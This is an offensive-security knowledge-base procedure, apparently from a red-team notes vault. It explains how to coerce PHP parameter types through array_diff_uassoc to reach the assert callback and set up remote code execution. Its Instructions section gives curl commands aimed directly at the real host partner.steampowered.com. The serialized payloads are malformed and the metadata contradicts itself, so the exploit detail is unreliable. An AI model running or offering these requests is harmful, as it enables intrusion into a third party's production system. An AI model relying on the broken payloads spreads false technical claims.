---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - php
  - type-manipulation
  - array-diff
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-manipulate-php-types]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:36.455Z'
skill_level: advanced
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manipulate-PHP-Array-Parameters-for-Type-Change

## Summary

This procedure exploits PHP's loose typing by using the array_diff_uassoc function to coerce array parameters into strings, changing the effective signature from (array, array, string) to (string, string) for callback functions.

## Description

The vulnerability on partner.steampowered.com allowed attackers to specify array_diff_uassoc as the function, with serialized array parameters that resolve to strings during comparison. This enables calling callbacks like assert with string arguments, bypassing expected type checks. Prerequisites include a vulnerable endpoint and knowledge of PHP serialization. Outcomes: Successful type coercion without errors, paving the way for RCE.

## Requirements

1. Confirmed vulnerable endpoint from prior reconnaissance
2. Ability to craft serialized PHP arrays in HTTP parameters
3. Proxy tool for request interception and modification

## Defense

Defensive measures and detection strategies:

- Use strict type declarations in PHP 7+ functions
- Sanitize and unserialize inputs only from trusted sources
- Log and alert on usage of functions like array_diff_uassoc with user data

## Objectives

1. Coerce parameter types to strings via array manipulation
2. Prepare for string-based callback invocation
3. Avoid PHP errors during type conversion

## Instructions

### Step 1: Craft Serialized Array Parameters

**Context**: Create array parameters that serialize to strings mimicking the desired function callback.

**Command** ([[commands/curl-manipulate-php-types]]):
```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"a:1:{s:6:\"0\";s:6:\"assert\"}\" &param2=\"b:1:{s:6:\"0\";s:6:\"assert\"}\" &param3=\"test\" \
  -v
```

> The serialized strings in param1 and param2 coerce to 'assert' during uassoc comparison, changing types to string.

### Step 2: Verify Type Coercion

**Context**: Submit and check response for successful processing without type errors.

**Command** ([[commands/curl-manipulate-php-types]]):
```bash
curl -X POST https://partner.steampowered.com/endpoint \
  -d "function_name=array_diff_uassoc&param_types=array,array,string&param1=\"assert\" &param2=\"callback\" &param3=\"string_param\" \
  -v
```

> Expected output: No fatal errors, confirming strings are accepted where arrays were expected.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-manipulate-php-types]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[type-confusion]]
- [[serialization]]
